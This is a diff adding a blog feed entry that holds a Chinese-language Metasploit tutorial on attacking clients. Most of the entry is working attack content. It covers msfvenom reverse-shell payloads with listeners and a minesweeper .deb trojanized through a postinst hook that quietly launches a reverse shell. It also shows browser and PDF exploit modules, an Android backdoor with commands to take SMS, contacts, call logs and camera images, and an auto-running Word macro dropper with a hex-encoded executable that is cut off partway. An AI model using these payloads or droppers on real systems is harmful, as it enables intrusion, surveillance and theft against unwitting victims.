+      <link href="/2016/03/09/Exploits/MsF/MsF%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/"/>
+      <url>/2016/03/09/Exploits/MsF/MsF%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%B8%97%E9%80%8F/</url>
+      
+        <content type="html"><![CDATA[<p><strong>在无法突破网络边界的情况下转而攻击客户端</strong></p><ul><li>社会工程学攻击</li><li>进而渗透线上业务网络</li></ul><p><strong>含有漏洞利用代码的WEB站点</strong></p><ul><li>利用客户端漏洞</li></ul><p><strong>含有漏洞利用代码的DOC,PDF等文档</strong></p><ul><li>诱骗被害者执行payload</li></ul><h4 id="诱骗被害者执行Payload-windows"><a href="#诱骗被害者执行Payload-windows" class="headerlink" title="诱骗被害者执行Payload(windows)"></a><strong>诱骗被害者执行Payload(windows)</strong></h4><p><strong>查看反弹连接的payload选项</strong></p><pre><code>msfvenom --list-options -p windows/shell/reverse_tcp</code></pre><p><strong>使用msfvenom生成Payload</strong></p><pre><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe</code></pre><p><strong>使用msfvenom加编码生成Payload</strong></p><pre><code>msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o cat.exe</code></pre><p><strong>利用msf监听反弹连接</strong>    </p><pre><code>msfdb runuse exploit/multi/handlerset payload windows/shell/reverse_tcpset LHOST 1.1.1.1set LPORT 4444exploit</code></pre><h4 id="诱骗被害者执行Payload-Linux-Deb安装包"><a href="#诱骗被害者执行Payload-Linux-Deb安装包" class="headerlink" title="诱骗被害者执行Payload(Linux Deb安装包)"></a><strong>诱骗被害者执行Payload(Linux Deb安装包)</strong></h4><p><strong>apt-get只下载deb包不安装</strong></p><pre><code>apt-get --download-only install freesweep    </code></pre><p><strong>dpkg -x 解包到free文件夹</strong></p><pre><code>dpkg -x freesweep_0.90-1_i386.deb free        </code></pre><p><strong>创建DEBIAN文件夹然后进入文件夹</strong></p><pre><code>mkdir free/DEBIAN &amp;&amp; cd free/DEBIAN</code></pre><p><code>vi control</code> <strong>写入以下内容</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Package: freesweep</span><br><span class="line">Version: 0.90-3</span><br><span class="line">Section: optional</span><br><span class="line">Architecture: i386</span><br><span class="line">Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)</span><br><span class="line">Description: a text-based minesweeper</span><br><span class="line">Freesweep is an implementation of the popular minesweeper game,where one tries to find all the mines without igniting any,based on hints given by the computer.Unlike most implementations of this game,Freesweep works in any visual text display - in linux console,in an xterm,and in most text-based terminals currently in use.</span><br><span class="line">postinst;</span><br></pre></td></tr></table></figure><p><code>vi postinst</code> <strong>写入以下脚本</strong></p><pre><code>#!/bin/sh#赋予执行权限并执行Payload并执行它,再执行正常程序sudo chmod 2755 /usr/games/freesweep_scores &amp;&amp; /usr/games/freesweep_scores &amp; /usr/games/freesweep &amp;chmod 755 postinst</code></pre><p><strong>生成Payload到该目录</strong></p><pre><code>msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b &quot;\x00&quot; -f elf -o /root/free/usr/games/freesweep_scores</code></pre><p><strong>打包deb</strong></p><pre><code>dpkg-deb --build /root/free</code></pre><h4 id="利用PDF阅读器漏洞执行payload"><a href="#利用PDF阅读器漏洞执行payload" class="headerlink" title="利用PDF阅读器漏洞执行payload"></a><strong>利用PDF阅读器漏洞执行payload</strong></h4><ul><li><p><strong>利用Acrobat Reader</strong></p></li><li><p>MsF构造PDF文件利用模块:</p><ul><li><p><code>use exploit/windows/fileformat/adobe_utilprintf</code></p><ul><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>set lhost 192.168.254.111</code></li><li><code>show options</code></li><li><code>exploit</code>        #生成包含payload的PDF文档</li></ul></li><li><p><code>use exploit/multi/handler</code></p><ul><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>set lhost 192.168.254.111</code></li><li><code>exploit -j</code></li></ul></li></ul></li></ul><ul><li><p>MsF构造恶意网站模块:</p><ul><li><p><code>use exploit/windows/browser/adobe_utilprintf</code></p><ul><li><code>show options</code></li><li><code>set SRVPORT 80</code>    #设置服务端口</li><li><code>set URIPATH /</code>    #设置web根路径</li><li><code>set payload windows/meterpreter/reverse_tcp</code>        #设置payload</li><li><code>set lhost 192.168.254.175</code></li><li><code>exploit -j</code></li></ul></li><li><p><strong>Meterpreter</strong></p><ul><li><code>use priv</code>        #本地提权</li><li><code>run post/windows/capture/keylog_recorder</code></li></ul></li></ul></li></ul><h4 id="利用Flash插件漏洞执行payload"><a href="#利用Flash插件漏洞执行payload" class="headerlink" title="利用Flash插件漏洞执行payload"></a><strong>利用Flash插件漏洞执行payload</strong></h4><ul><li><p><code>adobe_flash_hacking_team_uaf</code>利用模块由Hacking Team 2015年被泄露后,录入MSF</p><ul><li><code>use exploit/multi/browser/adobe_flash_hacking_team_uaf</code><ul><li><code>info</code></li><li><code>show options</code></li><li><code>set SRVPORT 80</code></li><li><code>set URIPATH /</code></li><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>set lhost 192.168.1.11</code></li><li><code>show targets</code></li><li><code>exploit</code></li></ul></li></ul></li><li><p><code>adobe_flash_opaque_background_uaf</code>利用模块也是由Hacking Team 2015年被泄露后,录入MSF        </p><ul><li><code>use exploit/multi/browser/adobe_flash_opaque_background_uaf</code><ul><li><code>show options</code></li><li><code>set SRVPORT 80</code></li><li><code>set URIPATH /</code></li><li><code>set payload windows/meterpreter/reverse_tcp</code></li><li><code>set lhost 192.168.1.11</code></li><li><code>show targets</code></li><li><code>exploit</code>    </li></ul></li></ul></li><li><p><code>browser_autopwn2</code>辅助模块可以把MSF里质量较好的所有浏览器漏洞利用模块统一启动起来</p><ul><li><code>use auxiliary/server/browser_autopwn2</code><ul><li><code>show options</code></li><li><code>set SRVPORT 80</code></li><li><code>set URIPATH /</code></li><li><code>exploit</code></li></ul></li></ul></li></ul><h4 id="利用IE浏览器漏洞执行payload"><a href="#利用IE浏览器漏洞执行payload" class="headerlink" title="利用IE浏览器漏洞执行payload"></a><strong>利用IE浏览器漏洞执行payload</strong></h4><pre><code>use exploit/windows/browser/Display all 246 possibilities? (y or n)        #MSF收录的浏览器漏洞利用模块目前有240+#使用ms14_064_ole_code_execution模块use exploit/windows/browser/ms14_064_ole_code_executioninfoshow optionsset SRVPORT 80set URIPATH /show targets        #针对Win xp 和 win7默认IE有效exploit</code></pre><h4 id="浏览器利用JRE漏洞执行payload"><a href="#浏览器利用JRE漏洞执行payload" class="headerlink" title="浏览器利用JRE漏洞执行payload"></a><strong>浏览器利用JRE漏洞执行payload</strong></h4><pre><code>#对java_jre1.7版本有效use exploit/multi/browser/java_jre17_driver_managershow optionsset SRVPORT 80set URIPATH /set payload java/meterpreter/reverse_tcpset lhost 192.168.190.175exploit#java_jre17_jmxbean模块use exploit/multi/browser/java_jre17_jmxbeanshow optionsset SRVPORT 80set URIPATH /set payload java/meterpreter/reverse_tcpset lhost 192.168.190.175exploit    #java_jre17_reflection_types模块use exploit/multi/browser/java_jre17_reflection_typesshow optionsset SRVPORT 80set URIPATH /set payload java/meterpreter/reverse_tcpset lhost 192.168.190.175exploit    </code></pre><h4 id="生成Android后门"><a href="#生成Android后门" class="headerlink" title="生成Android后门"></a><strong>生成Android后门</strong></h4><pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.2.146 LPORT=4444 R &gt; payload.apkuse exploit/multi/handlerset PAYLOAD android/meterpreter/reverse_tcpset LHOST 192.168.190.175exploit -jsearch     #搜索文件，命令：search text.jpgdownload #下载文件，命令：download test.jpgwebcam_list #查看摄像头列表，因为手机都是前置和后置摄像头了webcam_snap #拍照一张，需要选用前置或者后置摄像头，命令：webcam_snap -i 1webcam_stream #开启摄像头视频监控，同上，命令：webcam_stream -i 1安卓系统相关命令：check_root #查看当前安卓是否已经rootdump_calllog #下载通话记录dump_contacts #下载短信记录dump_sms #下载通讯录geolocate #利用谷歌地图定位（需要安装谷歌地图）</code></pre><h4 id="VBScript感染方式"><a href="#VBScript感染方式" class="headerlink" title="VBScript感染方式"></a><strong>VBScript感染方式</strong></h4><ul><li><p>利用宏感染word,excel文档</p></li><li><p>绕过某些基于文件类型检查的安全机制</p></li><li><p><strong>生成VBScript脚本</strong>:</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;1.1.1.1 LPORT&#x3D;4444 -e x86&#x2F;shikata_ga_nai -f vba-exe</span><br></pre></td></tr></table></figure></li><li><p><strong>Office 2007 +</strong></p><ul><li><strong>视图–宏–创建</strong></li><li><strong>Payload第一部分粘入VBA代码</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">Sub Auto_Open()</span><br><span class="line">Glwsj12</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Glwsj12()</span><br><span class="line">Dim Glwsj7 As Integer</span><br><span class="line">Dim Glwsj1 As String</span><br><span class="line">Dim Glwsj2 As String</span><br><span class="line">Dim Glwsj3 As Integer</span><br><span class="line">Dim Glwsj4 As Paragraph</span><br><span class="line">Dim Glwsj8 As Integer</span><br><span class="line">Dim Glwsj9 As Boolean</span><br><span class="line">Dim Glwsj5 As Integer</span><br><span class="line">Dim Glwsj11 As String</span><br><span class="line">Dim Glwsj6 As Byte</span><br><span class="line">Dim Gpxyxbdwpa as String</span><br><span class="line">Gpxyxbdwpa &#x3D; &quot;Gpxyxbdwpa&quot;</span><br><span class="line">Glwsj1 &#x3D; &quot;SWQeAqOHq.exe&quot;</span><br><span class="line">Glwsj2 &#x3D; Environ(&quot;USERPROFILE&quot;)</span><br><span class="line">ChDrive (Glwsj2)</span><br><span class="line">ChDir (Glwsj2)</span><br><span class="line">Glwsj3 &#x3D; FreeFile()</span><br><span class="line">Open Glwsj1 For Binary As Glwsj3</span><br><span class="line">For Each Glwsj4 in ActiveDocument.Paragraphs</span><br><span class="line">DoEvents</span><br><span class="line">Glwsj11 &#x3D; Glwsj4.Range.Text</span><br><span class="line">If (Glwsj9 &#x3D; True) Then</span><br><span class="line">Glwsj8 &#x3D; 1</span><br><span class="line">While (Glwsj8 &lt; Len(Glwsj11))</span><br><span class="line">Glwsj6 &#x3D; Mid(Glwsj11,Glwsj8,4)</span><br><span class="line">Put #Glwsj3, , Glwsj6</span><br><span class="line">Glwsj8 &#x3D; Glwsj8 + 4</span><br><span class="line">Wend</span><br><span class="line">ElseIf (InStr(1,Glwsj11,Gpxyxbdwpa) &gt; 0 And Len(Glwsj11) &gt; 0) Then</span><br><span class="line">Glwsj9 &#x3D; True</span><br><span class="line">End If</span><br><span class="line">Next</span><br><span class="line">Close #Glwsj3</span><br><span class="line">Glwsj13(Glwsj1)</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Glwsj13(Glwsj10 As String)</span><br><span class="line">Dim Glwsj7 As Integer</span><br><span class="line">Dim Glwsj2 As String</span><br><span class="line">Glwsj2 &#x3D; Environ(&quot;USERPROFILE&quot;)</span><br><span class="line">ChDrive (Glwsj2)</span><br><span class="line">ChDir (Glwsj2)</span><br><span class="line">Glwsj7 &#x3D; Shell(Glwsj10, vbHide)</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub AutoOpen()</span><br><span class="line">Auto_Open</span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub Workbook_Open()</span><br><span class="line">Auto_Open</span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure></li><li><strong>Paylaod第二部分粘入word文档正文</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Gpxyxbdwpa</span><br><span class="line">&amp;H4D&amp;H5A&amp;H90&amp;H00&amp;H03&amp;H00&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;HFF&amp;HFF&amp;H00&amp;H00&amp;HB8&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H80&amp;H00&amp;H00&amp;H00&amp;H0E&amp;H1F&amp;HBA&amp;H0E&amp;H00&amp;HB4&amp;H09&amp;HCD&amp;H21&amp;HB8&amp;H01&amp;H4C&amp;HCD&amp;H21&amp;H54&amp;H68&amp;H69&amp;H73&amp;H20&amp;H70&amp;H72&amp;H6F&amp;H67&amp;H72&amp;H61&amp;H6D&amp;H20&amp;H63&amp;H61&amp;H6E&amp;H6E&amp;H6F&amp;H74&amp;H20&amp;H62&amp;H65&amp;H20&amp;H72&amp;H75&amp;H6E&amp;H20&amp;H69&amp;H6E&amp;H20&amp;H44&amp;H4F&amp;H53&amp;H20&amp;H6D&amp;H6F&amp;H64&amp;H65&amp;H2E&amp;H0D&amp;H0D&amp;H0A&amp;H24&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H50&amp;H45&amp;H00&amp;H00&amp;H4C&amp;H01&amp;H03&amp;H00&amp;H80&amp;H8B&amp;H40&amp;H38&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HE0&amp;H00&amp;H0F&amp;H03&amp;H0B&amp;H01&amp;H02&amp;H38&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H0E&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;H01&amp;H00&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H46&amp;H3A&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H30&amp;H00&amp;H00&amp;H64&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H2E&amp;H74&amp;H65&amp;H78&amp;H74&amp;H00&amp;H00&amp;H00&amp;H28&amp;H00&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H30&amp;H60&amp;H2E&amp;H64&amp;H61&amp;H74&amp;H61&amp;H00&amp;H00&amp;H00&amp;H90&amp;H0A&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H00&amp;H00&amp;H0C&amp;H00&amp;H00&amp;H00&amp;H04&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H20&amp;H00&amp;H30&amp;HE0&amp;H2E&amp;H69&amp;H64&amp;H61&amp;H74&amp;H61&amp;H00&amp;H00&amp;H64&amp;H00&amp;H00&amp;H00&amp;H00&amp;H30&amp;H00&amp;H00&amp;H00&amp;H02&amp;H00&amp;H00&amp;H00&amp;H10&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H40&amp;H00&amp;H30&amp;HC0&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HB8&amp;H00&amp;H20&amp;H40&amp;H00&amp;HFF&amp;HE0&amp;H90&amp;HFF&amp;H25&amp;H38&amp;H30&amp;H40&amp;H00&amp;H90&amp;H90&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HFF&amp;HFF&amp;HFF&amp;HFF&amp;H00&amp;H00&amp;H00&amp;H00&amp;HFF&amp;HFF&amp;HFF&amp;HFF&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;H00&amp;HBE&amp;H38&amp;HFE&amp;H59&amp;H43&amp;HD9&amp;HC0&amp;HD9&amp;H74&amp;H24&amp;HF4&amp;H58&amp;H29&amp;HC9&amp;H66&amp;HB9&amp;H04&amp;H02&amp;H83&amp;HC0&amp;H04&amp;H31&amp;H70&amp;H11&amp;H03&amp;H70&amp;H29&amp;H1C&amp;HAC&amp;H72&amp;H89&amp;H88&amp;H47&amp;H65&amp;H49&amp;H49&amp;H3C&amp;H7A&amp;H79&amp;H2D&amp;H35&amp;HA4&amp;HC6&amp;HF9&amp;H5B&amp;HAE&amp;HB7&amp;HD8&amp;HB9&amp;H69&amp;HB3&amp;HF8&amp;HB5&amp;HD7&amp;H10&amp;HC8&amp;H87&amp;HBE&amp;H57&amp;HB7&amp;HF4&amp;H3D&amp;HEA&amp;H54&amp;H78&amp;HAC&amp;HBC&amp;HA7&amp;H80&amp;H5C&amp;H04&amp;HD4&amp;H7C&amp;H2F&amp;H4C&amp;H3F&amp;HF6&amp;H46&amp;HA5&amp;H9B&amp;HE9&amp;H63&amp;H8C&amp;H77&amp;H91&amp;H3D&amp;H5B&amp;H28&amp;H72&amp;H19&amp;HED&amp;HFA&amp;H67&amp;HF1&amp;H16&amp;H9C&amp;HBB&amp;H49&amp;H20&amp;H2C&amp;H1B&amp;H8B&amp;HAA&amp;H87&amp;H28&amp;H36&amp;H09&amp;H1B&amp;H58&amp;H1C&amp;H09&amp;H65&amp;H3A&amp;H29&amp;H4C&amp;H6E&amp;H6D&amp;HB8&amp;H84&amp;HCE&amp;H76&amp;H39&amp;HF8&amp;H8A&amp;H1A&amp;HC8&amp;H88&amp;H73&amp;HBE&amp;H9D&amp;H63&amp;H42&amp;H3D&amp;H95&amp;HAB&amp;HF0&amp;H89&amp;H7A&amp;H76&amp;H73&amp;H7C&amp;H94&amp;H7D&amp;H77&amp;H91&amp;H5C&amp;HB9&amp;H65&amp;H2F&amp;H9A&amp;HA8&amp;H69&amp;HEE&amp;HE2&amp;HE7&amp;H69&amp;HBB&amp;H5E&amp;HD9&amp;HE8&amp;H0A&amp;HDF&amp;H68&amp;H4A&amp;HC8&amp;H44&amp;H87&amp;H46&amp;H15&amp;HC4&amp;H63&amp;H69&amp;H73&amp;HC6&amp;H61&amp;HDE&amp;H6C&amp;H85&amp;H7B&amp;HAA&amp;H51&amp;HF1&amp;HA9&amp;HED&amp;H6A&amp;HD5&amp;H16&amp;H62&amp;H8C&amp;HCA&amp;H88&amp;HC5&amp;HD7&amp;HA6&amp;H04&amp;HE0&amp;H60&amp;H6E&amp;HBB&amp;H7B&amp;H93&amp;HC3&amp;H1E&amp;H4F&amp;H83&amp;HF4&amp;H29&amp;H71&amp;HDE&amp;H1A&amp;H60&amp;H5C&amp;HCB&amp;H79&amp;H09&amp;H51&amp;H7E&amp;H96&amp;HDA&amp;HEB&amp;H89&amp;H82&amp;H6A&amp;H60&amp;H21&amp;H77&amp;H9A&amp;H85&amp;H60&amp;HBC&amp;H52&amp;HA1&amp;H1A&amp;HAC&amp;H3A&amp;H02&amp;H2E&amp;H54&amp;H89&amp;H13&amp;HEC&amp;H2A&amp;H44&amp;HAE&amp;H27&amp;HDD&amp;HBA&amp;H2A&amp;H9C&amp;H39&amp;HEE&amp;HD7&amp;H59&amp;HBD&amp;H57&amp;H9A&amp;H71&amp;HDA&amp;H4E&amp;HB4&amp;HC7&amp;HF6&amp;HD9&amp;HB5&amp;HFD&amp;HC7&amp;H9F&amp;H44&amp;HAB&amp;H77&amp;H92&amp;H21&amp;HA9&amp;HD7&amp;HD7&amp;H83&amp;H3B&amp;H61&amp;H01&amp;H98&amp;HB4&amp;HE7&amp;HB0&amp;H40&amp;HCF&amp;H1B&amp;HBD&amp;H94&amp;H15&amp;HF6&amp;H33&amp;H91&amp;HA7&amp;H7B&amp;HCF&amp;H4B&amp;H0